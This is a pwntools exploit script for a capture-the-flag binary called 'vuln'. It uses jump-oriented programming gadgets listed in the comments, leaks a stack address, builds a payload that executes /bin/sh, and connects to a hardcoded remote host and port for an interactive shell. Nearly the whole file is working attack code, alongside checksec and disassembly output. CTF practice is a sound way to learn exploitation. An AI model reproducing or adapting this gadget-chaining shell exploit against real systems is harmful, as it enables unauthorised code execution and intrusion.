#!/usr/bin/env python3
from pwn import *
from subprocess import run

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.226.139.23', 31337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *0x040106d
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ file vuln 
# vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
# ┌─[192.168.83.128]─[halcyon@parrot]─[~/SharedFolder/finals/yqroo wants a job]
# └──╼ [★]$ pwn checksec vuln 
#     Arch:     amd64-64-little
#     RELRO:    No RELRO
#     Stack:    No canary found
#     NX:       NX unknown - GNU_STACK missing
#     PIE:      No PIE (0x400000)
#     Stack:    Executable

# gadgets:
# pwndbg> x/40i 0x401000                                                                                                                                                                                                                                                          
#    0x401000:    pop    rbx    
#    0x401001:    pop    rsp                                                                                                                                                      
#    0x401002:    pop    rdi
#    0x401003:    pop    rdx
#    0x401004:    pop    rsi
#    0x401005:    pop    rcx
#    0x401006:    jmp    QWORD PTR [rsi-0x25]

#    0x401009:    add    rdx,rcx
#    0x40100c:    jmp    QWORD PTR [rdx-0x45]

#    0x40100f:    nop           
#    0x401010:    nop                        
#    0x401011:    jmp    QWORD PTR [rcx-0x11]

#    0x401014:    add    eax,edi
#    0x401016:    jmp    QWORD PTR [rcx]     

#    0x401018:    pop    rbx    
#    0x401019:    jmp    QWORD PTR [rcx+0x47]

#    0x40101c:    jmp    QWORD PTR [rsp-0x64]

#    0x401020:    xor    rdx,rdx             
#    0x401023:    add    rcx,rax             
#    0x401026:    xor    rbx,rcx
#    0x401029:    jmp    rbx    
#    0x40102b:    add    rcx,QWORD PTR [rsp+0x18]                                                                                         
#    0x401030:    jmp    QWORD PTR [rdx-0x1d]

#    0x401033:    sub    rsi,rbx                                                          
#    0x401036:    jmp    QWORD PTR [rcx]     

#    0x401038:    xchg   rsi,rdi
#    0x40103b:    fwait                 
#    0x40103c:    sub    rax,rcx
#    0x40103f:    jmp    QWORD PTR [rdi+0xb]

#    0x401042:    mul    bl     
#    0x401044:    nop                       
#    0x401045:    stc      
#    0x401046:    xchg   rcx,rdx
#    0x401049:    jmp    QWORD PTR [rcx]

def exploit():
    global io

    io = initialize()
    stack = u64(io.recv(8))

    payload =  b'\x00'*4
    payload += flat([
        stack-0xf,              # rdi (start of  (stack-0x67))
        0x0,                    # rdx
        stack-0x47+0x25,        # rsi
        0x38,                   # rcx
        0x401038                # is *(stack-0x47+0x25), i.e. target for `jmp QWORD PTR [rsi-0x25]`
    ])
    payload += b'\x00' * (0x49-len(payload))
    payload += b'/bin/sh\x00'
    payload += b'\x00' * (0x54-len(payload))
    payload += p64(0x040105a)   # is target for `jmp QWORD PTR [rdi+0xb]`
    payload += b'\x00' * (99-len(payload))
    payload += flat([
        0x401000,               # will go to rbx
        (stack-0x67),           
    ])
    io.send(payload)

    log.success('stack: %#x', stack)
    log.success('new rsp: %#x', stack-0x67)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
